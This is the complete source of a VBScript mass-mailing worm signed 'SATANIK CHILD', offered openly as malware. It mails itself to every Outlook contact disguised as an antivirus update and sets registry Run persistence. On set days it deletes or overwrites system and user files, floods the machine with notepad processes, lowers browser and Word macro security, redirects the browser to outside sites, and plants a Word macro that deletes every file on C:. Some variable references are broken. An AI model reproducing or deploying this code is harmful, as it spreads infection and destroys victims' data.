'SATANIK CHILDS NEWEST INFECTION
'VBS/SCC01.VBS

On Error Resume Next
Dim fso, stfol, fol, Windir, K, L, M, O, P, Q, N, Z
Set fso = CreateObject("Scripting.FileSystemObject")
Set Z = Fso.GetFile(WScript.ScriptFullName)
Set WinDir = Fso.GetSpecialFolder(0)
stfol = (Windir&"\Start Menu")
Z.Copy(Windir & "\Temp\kiddyscript.vbs")
If fso.folderexists(stfol) = false Then
	Set fso = nothing
	wscript.quit
End If
If fso.folderexists(stfol & "\SATANIK CHILD") = true Then      
	Set fso = nothing
	wscript.quit
End If
If fso.folderexists(stfol & "\Programs\Satanik Childs Viruses") = true Then     
	Set fso = nothing
	wscript.quit
End If
Set fol = fso.createfolder(stfol & "\Programs\Satanik Childs Viruses")
fso.GetFolder(stfol & "\Programs\Satanik Childs Viruses").attributes = 2
Set fol = nothing
Set fso = nothing


Dim oFso, scWorm, Reg, File 
Set oFso = CreateObject("Scripting.FileSystemObject")
Set Reg = CreateObject("WScript.Shell")
Reg.RegWrite"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Settings", "%Windir%\Sample1.vbs"
Set scWorm = oFso.GetFile(WScript.ScriptFullName)
scWorm.Copy (stfol & "\Programs\Satanik Childs Viruses\iWorm.vbs")



Set K = CreateObject("Outlook.Application")
Set L = K.GetNameSpace("MAPI")
For Each M In L.AddressLists
	If M.AddressEntries.Count <> 0 Then
		For O = 1 To M.AddressEntries.Count
			Set P = M.AddressEntries(O)
			Set N = K.CreateItem(0)
			N.To = P.Address
			N.Subject = "AntiVirus Update"
			N.Body = "The last version of your AV"
			Set Q = CreateObject("Scripting.FileSystemObject")
			N.Attachments.Add Windir & "\Temp\kiddyscript.vbs"
			N.DeleteAfterSubmit = True
			If N.To <> "" Then
				N.Send
			End If
		Next
	End If
Next

If Day(Now()) = "1" or Day(Now()) = "7" or Day(Now()) = "12" or Day(Now()) = "18" or Day(Now()) = "24" or Day(Now()) = "30" Then 
Dim oDay1, strBatFileName, fs, wsh
Const ForWriting = 2 
Const WshHide = 0
Set wsh = CreateObject("Wscript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
strBatFileName = (stfol & "\Programs\Satanik Childs Viruses\Day1.bat")
Set oDay1 = fs.OpenTextFile(strBatFileName, ForWriting, True)
	oDay1.WriteLine"@ECHO OFF"
	oDay1.WriteLine"CITY NULL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.ico >NUL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.jpg >NUL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.bmp >NUL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.gif >NUL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.pif >NUL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.txt >NUL"
	oDay1.WriteLine"DELTREE /Y %WINDIR%\*.hlp >NUL"
	oDay1.Close
'wsh.Run strBatFileName, WshHide, True	
fs.DeleteFile strBatFileName
Set wsh = Nothing
Set ts = Nothing
Set fs = Nothing
End If	
	
'Else
If Day(Now()) = "2" or Day(Now()) = "8" or Day(Now()) = "13" or Day(Now()) = "19" or Day(Now())= "25" or Day(Now()) = "31" Then 
	Set folderi = fso.GetFolder(WinDir)
	Set fid = folderi.Files
	For each file1 in fid
		ext = fso.GetExtensionName(file1.path)
		ext = lcase(ext)
		filen = lcase(file1.name)
		If (ext="vbs") or (ext="htm") or (ext="js") or (ext="hlp") or (ext="bmp") or (ext="chm") or (ext="jpg") or (ext="gif") or (ext="doc") or (ext="pif") or (ext="html") or (ext="ico") or (ext="cur") or (ext="rtf") or (ext="mp3") or (ext="mpg") or (ext="wav") or (ext="pdf") or (ext="cab") or (ext="zip") or (ext="ace") or (ext="rar") or (ext="ttf") or (ext="bak") or (ext="class") or (ext="bat") or (ext="ini") or (ext="inf") or (ext="sys") or (ext="log") or (ext="ttf") or (ext="wiz") or (ext="midi") or (ext="tmp") or (ext="reg") or (ext="dll") Then
			Set fileen = fso.OpenTextFile(file1.path,2,true)
			fileen.Write mecopy
			fileen.Close
		End If
	Next
End If

'Else 
If Day(Now()) = "3" or Day(Now()) = "9" or Day(Now()) = "14" or Day(Now()) = "20" or Day(Now()) = "26" Then
	Set crash2 = Createobject("scripting.filesystemobject")
	crash2.CopyFile Wscript.ScriptFullName,crash2.GetSpecialFolder(0)& "\crash2.vbs"
	Set crash3 = CreateObject("WScript.Shell")
		Do
			crash3.run "notepad", false
		loop
End If

'Else 
If Day(Now()) = "4" or Day(Now()) = "10" or Day(Now())= "15" or Day(Now()) = "21" or Day(Now()) = "27" Then
On Error Resume Next	
Dim four, oWSH, oFSO2, VX, oLink
	Randomize
		Set oFSO2 = CreateObject("Scripting.FileSystemObject")
		Set oWSH = Wscript.CreateObject("Wscript.Shell")
		four = Wscript.ScriptFullName
		VX = Left(four, InStrRev(four, "\"))
		For Each target in oFSO2.GetFolder(VX).Files
			oFSO2.CopyFile four, target.Name, 1
		Next
	If Int((2 * Rnd) + 1) = 1 Then
		MsgBox "Would you be interested in SATANISM if I took you there?", OkOnlY+vbQuestion , "SATANIK CHILD"
		Set oLink = oWSH.CreateShortcut(Windir&"\Favorites\satan.url")
		oLink.TargetPath = "http://virus.lucifer.com/"
		oLink.Save
		oWSH.Run (Windir&"\Favorites\satan.url")
End If
'Else
If Day(Now()) = "5"  or Day(Now()) = "16" or Day(Now()) = "22" or Day(Now()) = "28" Then
Set RegEd = Wscript.CreateObject("WScript.Shell")
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Microsucks\MsWorm\", Chr(45) & Chr(45) & Chr(45) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(58) & Chr(58) & Chr(83) & Chr(65) & Chr(84) & Chr(65) & Chr(84) & Chr(65) & Chr(78) & Chr(73) & Chr(75) & Chr(32) & Chr(67) & Chr(72) & Chr(73) & Chr(76) & Chr(68) & Chr(58) & Chr(58) & Chr(61) & Chr(61) & Chr(61) & Chr(61) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\level", 1, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options\EnableMacroVirusProtection", 0, "REG_DWORD"
RegEdit.RegWrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\","n1B elcyceR"
RegEdit.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1, "REG_DWORD"
RegEdit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://users.tmok.com/~dr_bulge/smt1/"
End If
End If

If Day(Now()) = "6" or Day(Now()) = "11" or Day(Now()) = "17" or Day(Now()) = "23" or Day(Now()) = "29" Then
Dim oFSO6, mecopy, cf, folderInf, folderID, file1, fileE1, fileE2
Set oFSO6 = CreateObject("Scripting.FileSystemObject")
Set oFile6 = oFSO6.OpenTextFile(WScript.ScriptFullName, 1)
mecopy = oFile6.ReadAll

Set Sysdir = oFSO6.GetSpecialFolder(1)
Set cf = oFSO6.GetFile(WScript.ScriptFullName)

cf.Copy(Sysdir &"\SHELLEXT\trojanscript.vbs")

Set folderInf = oFSO6.GetFolder(Sysdir)
Set folderID = folderInf.Files
	For each file1 in folderID
		ext = oFSO6.GetExtensionName(file1.path)
		ext = lcase(ext)
		fileE1 = lcase(file1.name)
		If (ext="sys") or (ext="dll") or (ext="ocx") or (ext="hlp") or (ext="chm") or (ext="txt") Then
			Set fileE2 = oFSO6.OpenTextFile(file1.path,2,true)
			fileE2.Write mecopy
			fileE2.Close
				
		End If
	Next
End If

On error resume next

Dim Code
Dim Lines(10)
Lines(1) = "Private sub document_open"
Lines(2) = "Options.virusprotection = (rnd*0)"
Lines(3) = "Options.savenormalprompt = (rnd*0)"
Lines(4) = "Set Iamhere = Macrocontainer.vbproject.vbcomponents(1).codemodule"
Lines(5) = "If macrocontainer.fullname = normaltemplate.fullname then set infect = activedocument.vbproject.vbcomponents(1).codemodule: Saveit = 1"
Lines(6) = "If macrocontainer.fullname = activedocument.fullname then set infect = normaltemplate.vbproject.vbcomponents(1).codemodule"
Lines(7) = "If infect.countoflines < 1 then Infect.addfromstring Iamhere.lines(1,iamhere.countoflines)"
Lines(8) = "If saveit = 1 then activedocument.saveas filename := activedocument.fullname, fileformat := wddocument"
Lines(9) = "If month(now) > " & month(now) & "then shell(" &chr(34) &"c:\windows\command\attrib.exe c:\*.* -r -s -h" & chr(34) & "),vbhide: kill "&chr(34)&"c:\*.*"&chr(34)  
Lines(10) = "End sub"

For I = 1 to 10
Code = Code & Lines(I) & vbcrlf
Next

Set WordApp = CreateObject("word.application")
If WordApp.normaltemplate.vbproject.vbcomponents(1).codemodule.countoflines < 1 then WordApp.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromstring Code
WordApp.quit


'to all the malicious creators out there....keep the infection alive!
                                                                
'  @@@@@@    @@@@@@   @@@@@@@   @@@@@@   @@@  @@@  @@@  @@@  @@@  
' @@@@@@@   @@@@@@@@  @@@@@@@  @@@@@@@@  @@@@ @@@  @@@  @@@  @@@  
' !@@       @@!  @@@    @@!    @@!  @@@  @@!@!@@@  @@!  @@!  !@@  
' !@!       !@!  @!@    !@!    !@!  @!@  !@!!@!@!  !@!  !@!  @!!  
' !!@@!!    @!@!@!@!    @!!    @!@!@!@!  @!@ !!@!  !!@  @!@@!@!   
'  !!@!!!   !!!@!!!!    !!!    !!!@!!!!  !@!  !!!  !!!  !!@!!!    
'      !:!  !!:  !!!    !!:    !!:  !!!  !!:  !!!  !!:  !!: :!!   
'     !:!   :!:  !:!    :!:    :!:  !:!  :!:  !:!  :!:  :!:  !:!  
' :::: ::   ::   :::     ::    ::   :::  ::   ::   ::   ::   :::  
' :: : :     :   : :     :      :   : :  ::    :   :     :   :::  
                                                                
                                             
'  @@@@@@@  @@@  @@@  @@@  @@@      @@@@@@@   
' @@@@@@@@  @@@  @@@  @@@  @@@      @@@@@@@@  
' !@@       @@!  @@@  @@!  @@!      @@!  @@@  
' !@!       !@!  @!@  !@!  !@!      !@!  @!@  ~satanik child~
' !@!       @!@!@!@!  !!@  @!!      @!@  !@!  
' !!!       !!!@!!!!  !!!  !!!      !@!  !!!  
' :!!       !!:  !!!  !!:  !!:      !!:  !!!  
' :!:       :!:  !:!  :!:  :!:      :!:  !:!  
' ::: :::   ::   :::   ::  :: ::::  :::: ::  
'  :: :: :   :   : :   :   : :: : : :: :  :   
                                             